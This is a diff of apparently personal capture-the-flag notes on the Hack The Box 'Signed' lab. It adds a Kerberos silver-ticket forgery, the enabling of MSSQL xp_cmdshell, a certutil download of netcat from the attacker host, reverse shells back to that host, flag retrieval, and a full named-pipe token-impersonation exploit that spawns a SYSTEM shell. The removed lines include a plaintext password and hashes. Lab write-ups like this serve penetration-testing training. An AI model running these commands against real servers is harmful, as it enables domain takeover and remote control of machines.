@@ -237,6 +237,11 @@ SIGNED\Domain Users   b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000
 SQL (SIGNED\mssqlsvc  guest@master)> 
 ```
 
+Maybe?
+```
+nxc mssql 10.10.11.90 -u 'mssqlsvc' -p 'pur*******' \
+  -q "SELECT name, master.dbo.fn_varbintohexstr(sid) AS sidhex FROM sys.server_principals;"
+```
 
 <img width="747" height="506" alt="image" src="https://github.com/user-attachments/assets/5afc9a23-5571-450b-b4d2-bc8fc0a48917" />
 
@@ -244,17 +249,11 @@ SQL (SIGNED\mssqlsvc  guest@master)>
 ## Silver Ticket 
 
 ```
-python3 /usr/share/doc/python3-impacket/examples/ticketer.py \                                                  
-  -nthash d37d613913ad137c17b40b1bb6407f1d \
-  -domain-sid S-1-5-21-267716869-584017176-3399940237 \
-  -domain SIGNED.HTB \
-  -spn MSSQLSvc/dc01.signed.htb \
-  -groups 512,1105,513 \
-  -user-id 1103 mssqlsvc
+impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc  -domain-sid S-1-5-21-4088429403-1159899800-2753317549   -domain signed.htb   -spn mssqlsvc/dc01.signed.htb   -groups 512,1105,513   -user-id 1103   mssqlsvc
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Creating basic skeleton ticket and PAC Infos
-[*] Customizing ticket for SIGNED.HTB/mssqlsvc
+[*] Customizing ticket for signed.htb/mssqlsvc
 [*]     PAC_LOGON_INFO
 [*]     PAC_CLIENT_INFO_TYPE
 [*]     EncTicketPart
@@ -266,99 +265,325 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*]     EncTGSRepPart
 [*] Saving ticket in mssqlsvc.ccache
 
+┌──(ClearLotus㉿kali)-[~/signed]
+└─$ export KRB5CCNAME=$(pwd)/mssqlsvc.ccache                                                                        
 
+┌──(ClearLotus㉿kali)-[~/signed]
+└─$ impacket-mssqlclient -k mssqlsvc@dc01.signed.htb -no-pass -windows-authImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\mssqlsvc  dbo@master)> 
 ```
 
-```
-export KRB5CCNAME=$(pwd)/mssqlsvc.ccache
-```
-
-
-
-
-
-## Foothold with MSSQLSVC
+## Enabling xp_cmdshell
 
 ```
-echo -n 'puPLE9795!' | iconv -f utf8 -t utf16le | openssl dgst -md4
-```
-
-```
-python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
-  -nthash 1b5b8b031e041c8f9c25bee1778d11b9 \
-  -domain-sid S-1-5-21-1394779446-3015841977-3591561457 \
-  -domain SIGNED.HTB \
-  -user MSSQLSVC \
-  MSSQLSvc/DC01.signed.htb
-```
-
-`[*] Saving ticket in MSSQLSvc.DC01.signed.htb.ccache`
-
-```
-export KRB5CCNAME=MSSQLSvc.DC01.signed.htb.ccache
-```
-
-Add to /etc/hosts
-
-```
-10.129.242.173 DC01.signed.htb DC01 SIGNED.HTB
-```
-
-```
-python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -k -no-pass MSSQLSVC@10.129.242.173 -dc-ip 10.129.242.173
-```
-
-X These methods are giving trouble
-
-Next:
-
-```
-echo -n 'puPLE9795!' | iconv -f utf8 -t utf16le | openssl dgst -md4
-```
-
-```
-python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
-  -nthash 1b5b8b031e041c8f9c25bee1778d11b9 \
-  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
-  -domain signed.htb \
-  -spn mssqlsvc/dc01.signed.htb \
-  -groups 512,1105,513 \
-  -user-id 1103 \
-  mssqlsvc
-```
-
-```
-export KRB5CCNAME=mssqlsvc.ccache
-```
-
-```
-klist
-```
-
-```
-klist
-Ticket cache: FILE:mssqlsvc.ccache
-Default principal: mssqlsvc@SIGNED.HTB
-
-Valid starting       Expires              Service principal
-01/15/2026 15:27:27  01/13/2036 15:27:27  mssqlsvc/dc01.signed.htb@SIGNED.HTB
-        renew until 01/13/2036 15:27:27
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell';
 ```
 
 
+## Getting Shell
+
+Download nc.64
+
+```
+wget https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -O nc64.exe
+```
+Start server: 
+
+```
+python3 -m http.server 8000
+```
+
+Inside your SQL shell:
+
+```
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.129:8000/nc64.exe C:\ProgramData\nc64.exe';
+```
+
+Confirm file exists on target
+
+```
+EXEC xp_cmdshell 'dir C:\ProgramData\';
+```
+
+Start listener on KALI:
+```
+nc -lvnp 9999
+```
+
+Trigger the Reverse Shell:
+```
+EXEC xp_cmdshell 'C:\ProgramData\nc64.exe 10.10.14.129 9999 -e cmd.exe';
+```
+
+<img width="651" height="164" alt="image" src="https://github.com/user-attachments/assets/844281b5-886e-4724-b1d1-deaf3a8af0bd" />
+
+## User.txt
+
+```
+C:\Users\mssqlsvc>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is BED4-436E
+
+ Directory of C:\Users\mssqlsvc
+
+10/02/2025  08:27 AM    <DIR>          .
+10/02/2025  08:27 AM    <DIR>          ..
+10/02/2025  08:50 AM    <DIR>          Desktop
+10/02/2025  08:27 AM    <DIR>          Documents
+09/14/2018  11:19 PM    <DIR>          Downloads
+09/14/2018  11:19 PM    <DIR>          Favorites
+09/14/2018  11:19 PM    <DIR>          Links
+09/14/2018  11:19 PM    <DIR>          Music
+09/14/2018  11:19 PM    <DIR>          Pictures
+09/14/2018  11:19 PM    <DIR>          Saved Games
+09/14/2018  11:19 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              11 Dir(s)   6,382,608,384 bytes free
+
+C:\Users\mssqlsvc>cd Desktop
+cd Desktop
+
+C:\Users\mssqlsvc\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is BED4-436E
+
+ Directory of C:\Users\mssqlsvc\Desktop
+
+10/02/2025  08:50 AM    <DIR>          .
+10/02/2025  08:50 AM    <DIR>          ..
+01/15/2026  11:34 AM                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   6,382,608,384 bytes free
+
+C:\Users\mssqlsvc\Desktop>cat user.txt
+cat user.txt
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\mssqlsvc\Desktop>type user.txt
+type user.txt
+b2750e12a3495234d48d102ea6b32aed
+
+C:\Users\mssqlsvc\Desktop>
+```
+
+
+## Root Flag
+
+from the xp_commandshell
+```
+SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;
+```
+
+
+```
+whoami /priv
+```
+
+```
+C:\Users>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                        State   
+============================= ================================== ========
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
+SeCreateGlobalPrivilege       Create global objects              Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
+
+```
+
+Change to powershell 
+
+```
+powershell
+```
+
+```
+mkdir namedpipe && cd namedpipe                      
+nano Invoke-NamedPipe-Impersonation.ps1
+```
+
+powershell script:
+
+```
+C:\Users>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+
+C:\Users>
+```
+
+```
+C:\Users>Get-NtToken
+Get-NtToken
+'Get-NtToken' is not recognized as an internal or external command,
+operable program or batch file.
+```
 
 
 
 
+```
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.IO.Pipes;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Security.Principal;
 
+public class PipeServer {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
 
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr GetCurrentThread();
 
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
 
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
 
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool RevertToSelf();
 
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine,
+        int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
 
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
 
+    public static void StartServer() {
+        var pipe = new NamedPipeServerStream("pwnpipe", PipeDirection.InOut, 1,
+            PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
+        Console.WriteLine("[*] Waiting for connection on \\\\.\\pipe\\pwnpipe ...");
+        pipe.WaitForConnection();
+        Console.WriteLine("[+] Client connected!");
+
+        if (!ImpersonateNamedPipeClient(pipe.SafePipeHandle.DangerousGetHandle())) {
+            Console.WriteLine("[-] Failed to impersonate client.");
+            return;
+        }
+
+        IntPtr token;
+        if (!OpenThreadToken(GetCurrentThread(), 0x0002 | 0x0008 | 0x0010, false, out token)) {
+            Console.WriteLine("[-] Failed to open thread token.");
+            return;
+        }
+
+        IntPtr dupToken;
+        if (!DuplicateToken(token, 2, out dupToken)) {
+            Console.WriteLine("[-] Failed to duplicate token.");
+            return;
+        }
+
+        RevertToSelf();
+
+        STARTUPINFO si = new STARTUPINFO();
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        si.cb = Marshal.SizeOf(si);
+
+        string cmd = "cmd.exe";
+        bool result = CreateProcessWithTokenW(dupToken, 0, null, cmd, 0, IntPtr.Zero, null, ref si, out pi);
+        if (result) {
+            Console.WriteLine("[+] Spawned SYSTEM shell!");
+        } else {
+            Console.WriteLine("[-] Failed to spawn process.");
+        }
+    }
+}
+"@ -Language CSharp
+
+[PipeServer]::StartServer()
+```
+
+```
+python3 -m http.server 8000
+```
+
+On shell:
+
+```
+cd C:\ProgramData
+certutil -urlcache -split -f http://10.10.14.129:8000/Invoke-NamedPipe-Impersonation.ps1 pwnpipe.ps1
+```
+
+Now on another shell in the same box step: 
+
+```
+ sudo nc -lnvp 5555
+listening on [any] 5555 ...                              
+connect to [10.10.14.129] from (UNKNOWN) [10.129.242.173] 56359                                                   
+Microsoft Windows [Version 10.0.17763.7314]              
+(c) 2018 Microsoft Corporation. All rights reserved.     
+                                                         
+C:\Windows\system32>
+```
+
+```
+└─$ impacket-mssqlclient -k mssqlsvc@dc01.signed.htb -no-pass -windows-auth                                       
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                        
+                                                         
+[*] Encryption required, switching to TLS                
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                                                     
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english                                                       
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                                                      
+[*] INFO(DC01): Line 1: Changed database context to 'master'.                                                     
+[*] INFO(DC01): Line 1: Changed language setting to us_english.                                                   
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)     
+[!] Press help for extra shell commands                  
+SQL (SIGNED\mssqlsvc  dbo@master)> EXEC xp_cmdshell 'C:\ProgramData\nc64.exe 10.10.14.129 5555 -e cmd.exe';       
+                                                         
+```
 
 
 
